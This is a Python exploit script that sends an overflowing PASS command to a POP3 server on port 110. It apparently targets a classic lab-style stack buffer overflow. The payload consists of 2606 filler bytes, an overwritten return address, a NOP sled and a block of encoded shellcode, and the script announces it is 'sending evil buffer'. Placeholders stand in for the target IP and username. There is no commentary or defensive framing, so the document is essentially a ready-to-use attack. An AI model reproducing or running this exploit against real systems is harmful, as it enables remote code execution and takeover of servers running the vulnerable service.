import struct

import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

buff = "A" * 2606
buff += "\x8f\x35\x4a\x5f"
buff += "\x90" * 16
buff += b"\xdb\xd6\xb8\x56\x52\x35\xbc\xd9\x74\x24\xf4\x5a\x2b"
buff += b"\xc9\xb1\x52\x83\xea\xfc\x31\x42\x13\x03\x14\x41\xd7"
buff += b"\x49\x64\x8d\x95\xb2\x94\x4e\xfa\x3b\x71\x7f\x3a\x5f"
buff += b"\xf2\xd0\x8a\x2b\x56\xdd\x61\x79\x42\x56\x07\x56\x65"
buff += b"\xdf\xa2\x80\x48\xe0\x9f\xf1\xcb\x62\xe2\x25\x2b\x5a"
buff += b"\x2d\x38\x2a\x9b\x50\xb1\x7e\x74\x1e\x64\x6e\xf1\x6a"
buff += b"\xb5\x05\x49\x7a\xbd\xfa\x1a\x7d\xec\xad\x11\x24\x2e"
buff += b"\x4c\xf5\x5c\x67\x56\x1a\x58\x31\xed\xe8\x16\xc0\x27"
buff += b"\x21\xd6\x6f\x06\x8d\x25\x71\x4f\x2a\xd6\x04\xb9\x48"
buff += b"\x6b\x1f\x7e\x32\xb7\xaa\x64\x94\x3c\x0c\x40\x24\x90"
buff += b"\xcb\x03\x2a\x5d\x9f\x4b\x2f\x60\x4c\xe0\x4b\xe9\x73"
buff += b"\x26\xda\xa9\x57\xe2\x86\x6a\xf9\xb3\x62\xdc\x06\xa3"
buff += b"\xcc\x81\xa2\xa8\xe1\xd6\xde\xf3\x6d\x1a\xd3\x0b\x6e"
buff += b"\x34\x64\x78\x5c\x9b\xde\x16\xec\x54\xf9\xe1\x13\x4f"
buff += b"\xbd\x7d\xea\x70\xbe\x54\x29\x24\xee\xce\x98\x45\x65"
buff += b"\x0e\x24\x90\x2a\x5e\x8a\x4b\x8b\x0e\x6a\x3c\x63\x44"
buff += b"\x65\x63\x93\x67\xaf\x0c\x3e\x92\x38\xf3\x17\x9e\xb1"
buff += b"\x9b\x65\x9e\xc5\x89\xe3\x78\xaf\x3d\xa2\xd3\x58\xa7"
buff += b"\xef\xaf\xf9\x28\x3a\xca\x3a\xa2\xc9\x2b\xf4\x43\xa7"
buff += b"\x3f\x61\xa4\xf2\x1d\x24\xbb\x28\x09\xaa\x2e\xb7\xc9"
buff += b"\xa5\x52\x60\x9e\xe2\xa5\x79\x4a\x1f\x9f\xd3\x68\xe2"
buff += b"\x79\x1b\x28\x39\xba\xa2\xb1\xcc\x86\x80\xa1\x08\x06"
buff += b"\x8d\x95\xc4\x51\x5b\x43\xa3\x0b\x2d\x3d\x7d\xe7\xe7"
buff += b"\xa9\xf8\xcb\x37\xaf\x04\x06\xce\x4f\xb4\xff\x97\x70"
buff += b"\x79\x68\x10\x09\x67\x08\xdf\xc0\x23\x38\xaa\x48\x05"
buff += b"\xd1\x73\x19\x17\xbc\x83\xf4\x54\xb9\x07\xfc\x24\x3e"
buff += b"\x17\x75\x20\x7a\x9f\x66\x58\x13\x4a\x88\xcf\x14\x5f"
try:
        print "\nSending evil buffer..."
        s.connect(('ip',110))
        data = s.recv(1024)
        s.send('USER username' +'\r\n')
        data = s.recv(1024)
        s.send('PASS ' + buff + '\r\n')
        data = s.recv(1024)
        s.close()
except:
        print "Could not connect to POP3!"
